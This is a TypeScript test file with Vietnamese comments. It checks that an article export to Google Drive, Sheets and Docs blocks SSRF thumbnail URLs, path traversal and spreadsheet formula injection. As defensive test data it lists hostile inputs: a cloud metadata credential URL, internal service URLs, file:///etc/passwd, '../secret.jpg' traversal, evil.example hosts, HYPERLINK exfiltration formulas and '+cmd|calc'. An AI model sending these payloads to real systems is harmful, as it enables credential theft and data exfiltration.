import assert from 'node:assert/strict'
import { EventEmitter } from 'node:events'
import type { IncomingMessage } from 'node:http'
import type { RequestOptions } from 'node:https'
import { Readable } from 'node:stream'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import test, { after, mock } from 'node:test'

/**
 * Xuất bài viết → Google: `thumbnail_url` là ô biên tập viên gõ tay. Trước bản vá,
 * máy chủ `fetch()` thẳng URL đó (SSRF: metadata cloud, MySQL nội bộ…), tải bytes
 * lên Drive và chia sẻ "anyone: reader"; Sheets nhận `=IMAGE("<url>")` không thoát
 * nháy và tiêu đề `=HYPERLINK(...)` thành công thức sống.
 *
 * Chạy `exportArticlesToGoogle` thật với Google API giả, `fetch` giả và một thư
 * mục `public/uploads` tạm — ghi lại mọi thứ máy chủ tải và gửi sang Google.
 */

const R2_PUBLIC = 'cdn.example-r2.dev' // cán bộ hay dán thiếu https://

const fetched: string[] = []
const fetchOptions: RequestOptions[] = []
const driveCreates: Array<{ name?: string, mimeType?: string, media?: { mimeType: string, body: Buffer } }> = []
const permissionCreates: unknown[] = []
const sheetValues: Array<(string | number)[][]> = []
const docRequests: unknown[][] = []

mock.module('google-auth-library', {
  namedExports: { OAuth2Client: class { setCredentials() {} } },
})
let fileCounter = 0
mock.module('@googleapis/drive', {
  namedExports: {
    drive: () => ({
      files: {
        list: async () => ({ data: { files: [] } }),
        create: async (input: { requestBody: { name?: string, mimeType?: string }, media?: { mimeType: string, body: Buffer } }) => {
          driveCreates.push({ name: input.requestBody.name, mimeType: input.requestBody.mimeType, media: input.media })
          fileCounter += 1
          return { data: { id: `file-${fileCounter}` } }
        },
      },
      permissions: { create: async (input: unknown) => { permissionCreates.push(input) } },
    }),
  },
})
mock.module('@googleapis/sheets', {
  namedExports: {
    sheets: () => ({
      spreadsheets: {
        values: { update: async (input: { requestBody: { values: (string | number)[][] } }) => { sheetValues.push(input.requestBody.values) } },
        batchUpdate: async () => ({}),
      },
    }),
  },
})
let docCounter = 0
mock.module('@googleapis/docs', {
  namedExports: {
    docs: () => ({
      documents: {
        create: async () => { docCounter += 1; return { data: { documentId: `doc-${docCounter}` } } },
        batchUpdate: async (input: { requestBody: { requests: unknown[] } }) => { docRequests.push(input.requestBody.requests) },
      },
    }),
  },
})
mock.module('../server/services/media', {
  namedExports: {
    loadR2Config: async () => ({ accountId: 'a', accessKeyId: 'k', secretAccessKey: 's', bucket: 'b', publicUrl: R2_PUBLIC }),
  },
})

const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex')
// R2 thumbnails go through `safeProviderRequest` (server/utils/chatbot/outbound.ts),
// i.e. `node:https` + `node:dns/promises`, not `fetch`. Fake both at the module
// boundary so the REAL outbound policy runs; record every request the server makes.
let respond: () => { status: number, headers: Record<string, string>, body: Buffer } = () => ({ status: 200, headers: { 'content-type': 'image/png' }, body: PNG })
// A bare `fetch` must never be used again for these URLs: record it as a request
// (so every "nothing fetched" assertion still catches it) and fail it.
globalThis.fetch = (async (input: string | URL | Request) => {
  fetched.push(`fetch:${String(input)}`)
  throw new Error('bare fetch is not allowed in the export path')
}) as typeof fetch
mock.module('node:dns/promises', {
  namedExports: {
    resolve4: async () => ['104.18.2.2'],
    resolve6: async () => { throw Object.assign(new Error('no AAAA'), { code: 'ENODATA' }) },
  },
})
mock.module('node:https', {
  namedExports: {
    request: (options: RequestOptions, onResponse: (response: IncomingMessage) => void) => {
      fetched.push(`https://${options.hostname}${options.path}`)
      fetchOptions.push(options)
      const req = Object.assign(new EventEmitter(), {
        write: () => {},
        destroy: () => {},
        end: () => {
          queueMicrotask(() => {
            const { status, headers, body } = respond()
            onResponse(Object.assign(Readable.from([body]), { statusCode: status, headers }) as unknown as IncomingMessage)
          })
        },
      })
      return req
    },
  },
})

// A disposable site root with one real upload, and the current directory set to it
// (uploads live under `<cwd>/public/uploads`, as `uploadLocalFile` writes them).
const originalCwd = process.cwd()
const siteRoot = mkdtempSync(path.join(tmpdir(), 'cdkt-export-'))
mkdirSync(path.join(siteRoot, 'public', 'uploads', '2026', '10'), { recursive: true })
writeFileSync(path.join(siteRoot, 'public', 'uploads', '2026', '10', 'anh-bia.jpg'), Buffer.from('ffd8ffe000104a464946', 'hex'))
writeFileSync(path.join(siteRoot, 'secret.jpg'), Buffer.from('ffd8ff', 'hex'))
process.chdir(siteRoot)
after(() => {
  process.chdir(originalCwd)
  rmSync(siteRoot, { recursive: true, force: true })
})

const { exportArticlesToGoogle, buildExportSheetValues, sheetsImageFormula } = await import('../server/services/article-export-google')
const { classifyThumbnailSource } = await import('../server/services/article-export-thumbnail')

function article(id: number, thumbnailUrl: string | null, title = `Bài ${id}`) {
  return { id, title, slug: `bai-${id}`, excerpt: null, content: '<p>Nội dung</p>', thumbnailUrl, authorName: null, categoryName: null, publishedAt: new Date('2026-10-01'), createdAt: null }
}

function reset() {
  fetched.length = 0
  fetchOptions.length = 0
  driveCreates.length = 0
  permissionCreates.length = 0
  sheetValues.length = 0
  docRequests.length = 0
}

const uploadedThumbs = () => driveCreates.filter(c => c.media)

test('URLs that are not this site\'s media are never fetched — the export still completes', async () => {
  reset()
  const hostile = [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://cdkt_mysql:3306/',
    'http://127.0.0.1:3000/api/admin/settings',
    'https://evil.example/x.png',
    'http://cdn.example-r2.dev/2026/10/a.png', // đúng host nhưng không https
    'https://cdn.example-r2.dev.evil.example/a.png', // host chỉ "bắt đầu bằng"
    'https://user:pw@cdn.example-r2.dev/a.png',
    '//cdn.example-r2.dev/a.png',
    'file:///etc/passwd',
  ]
  const result = await exportArticlesToGoogle('rt', 'cid', 'cs', hostile.map((url, i) => article(i + 1, url)), '20261013')
  assert.equal(result.count, hostile.length, 'every article is still exported, just without the image')
  assert.deepEqual(fetched, [], 'the server made no request for any of them')
  assert.equal(uploadedThumbs().length, 0)
})

test('local /uploads paths are read from disk, never over the network; traversal is refused', async () => {
  reset()
  await exportArticlesToGoogle('rt', 'cid', 'cs', [
    article(1, '/uploads/2026/10/anh-bia.jpg?v=3'),
    article(2, '/uploads/../secret.jpg'),
    article(3, '/uploads/%2e%2e/secret.jpg'),
    article(4, '/uploads/2026/10/khong-co.jpg'),
    article(5, '/api/admin/settings'),
  ], '20261013')
  assert.deepEqual(fetched, [])
  const thumbs = uploadedThumbs()
  assert.equal(thumbs.length, 1, 'only the real upload is copied')
  assert.equal(thumbs[0]!.name, 'thumb-1.jpg')
  assert.equal(thumbs[0]!.media!.mimeType, 'image/jpeg')
})

test('the configured R2 host is fetched with redirects refused, and the copy is NOT shared publicly', async () => {
  reset()
  await exportArticlesToGoogle('rt', 'cid', 'cs', [article(7, 'https://CDN.example-r2.dev/2026/10/a.png')], '20261013')
  assert.deepEqual(fetched, ['https://cdn.example-r2.dev/2026/10/a.png'])
  // safeProviderRequest never follows a redirect (see article-export-thumbnail-fetch.test.ts);
  // here: the connection is pinned to the address checked by DNS, on its own socket.
  assert.equal(fetchOptions[0]?.agent, false)
  assert.equal(typeof fetchOptions[0]?.lookup, 'function')
  assert.equal(uploadedThumbs().length, 1)
  assert.deepEqual(permissionCreates, [], 'no "anyone with the link" share')
  // The Doc links the Drive copy, not the editor-typed URL.
  const flat = JSON.stringify(docRequests[0])
  assert.match(flat, /https:\/\/drive\.google\.com\/file\/d\/file-\d+\/view/)
  assert.doesNotMatch(flat, /cdn\.example-r2\.dev/)
})

test('a non-image response from R2 is dropped', async () => {
  reset()
  const realRespond = respond
  respond = () => ({ status: 200, headers: { 'content-type': 'text/html' }, body: Buffer.from('<html>') })
  try {
    await exportArticlesToGoogle('rt', 'cid', 'cs', [article(8, 'https://cdn.example-r2.dev/x.png')], '20261013')
  } finally {
    respond = realRespond
  }
  assert.equal(fetched.length, 1)
  assert.equal(uploadedThumbs().length, 0)
})

test('sheet cells: titles cannot become formulas and IMAGE() cannot be broken out of', async () => {
  reset()
  await exportArticlesToGoogle('rt', 'cid', 'cs', [
    article(1, 'https://cdn.example-r2.dev/a.png?x=")&HYPERLINK("https://evil', '=HYPERLINK("https://evil/?"&A1,"Bấm")'),
    article(2, 'javascript:alert(1)', '+cmd|calc'),
    article(3, '/uploads/2026/10/anh-bia.jpg', '-1+2'),
    article(4, null, '@SUM(A1)'),
    article(5, null, 'Tiêu đề bình thường'),
  ], '20261013')
  const rows = sheetValues[0]!
  const byId = new Map(rows.slice(1).map(row => [row[0], row]))
  assert.equal(byId.get(1)![1], `'=HYPERLINK("https://evil/?"&A1,"Bấm")`)
  assert.equal(byId.get(2)![1], `'+cmd|calc`)
  assert.equal(byId.get(3)![1], `'-1+2`)
  assert.equal(byId.get(4)![1], `'@SUM(A1)`)
  assert.equal(byId.get(5)![1], 'Tiêu đề bình thường')
  const image = String(byId.get(1)![2])
  assert.match(image, /^=IMAGE\("https:\/\/cdn\.example-r2\.dev\/a\.png\?x=[^"]*"\)$/, 'one string literal, nothing appended')
  assert.equal(byId.get(2)![2], '', 'non-https is not put in IMAGE()')
  assert.equal(byId.get(3)![2], '', 'a relative path cannot be fetched by Google anyway')
})

test('pure helpers', () => {
  assert.equal(sheetsImageFormula('https://a.example/x"y.png'), '=IMAGE("https://a.example/x%22y.png")')
  assert.equal(sheetsImageFormula('http://a.example/x.png'), '')
  assert.equal(sheetsImageFormula(null), '')
  const values = buildExportSheetValues([{ id: 1, title: '\t=1', thumbnailUrl: null, docUrl: 'https://docs.google.com/document/d/x/edit' }])
  assert.equal(values[1]![1], `'\t=1`)
  assert.equal(classifyThumbnailSource('https://cdn.example-r2.dev/a.png', ''), null, 'no R2 configured → no remote source at all')
  assert.equal(classifyThumbnailSource('/uploads/a.svg', R2_PUBLIC, siteRoot), null, 'only raster image extensions')
})

test('the Doc\'s meta line carries the Vietnamese calendar day, in any process time zone (FINDING-R6-17)', async () => {
  const before = process.env.TZ
  try {
    for (const zone of ['UTC', 'Asia/Ho_Chi_Minh']) {
      process.env.TZ = zone
      reset()
      // 03:00 on 29 October in Hà Nội; a process on UTC used to print the 28th. The day is
      // the publication's, not the creation's (1 September).
      await exportArticlesToGoogle('rt', 'cid', 'cs', [{ ...article(9, null), publishedAt: new Date(Date.UTC(2026, 9, 28, 20)), createdAt: new Date(Date.UTC(2026, 8, 1, 3)) }], '20261029')
      assert.match(JSON.stringify(docRequests), /Ngày: 2026-10-29/, zone)
    }
  } finally {
    process.env.TZ = before
  }
})

test('an article whose date the database could not give back (Invalid Date) is exported with an empty day, not a failed export', async () => {
  reset()
  const result = await exportArticlesToGoogle('rt', 'cid', 'cs', [{ ...article(10, null), publishedAt: new Date(Number.NaN) }, article(11, null)], '20261029')
  // Before: `vietnamDateString` threw a RangeError for the first article.
  assert.equal(result.count, 2)
  assert.match(JSON.stringify(docRequests[0]), /Ngày: (?!\d)/)
})
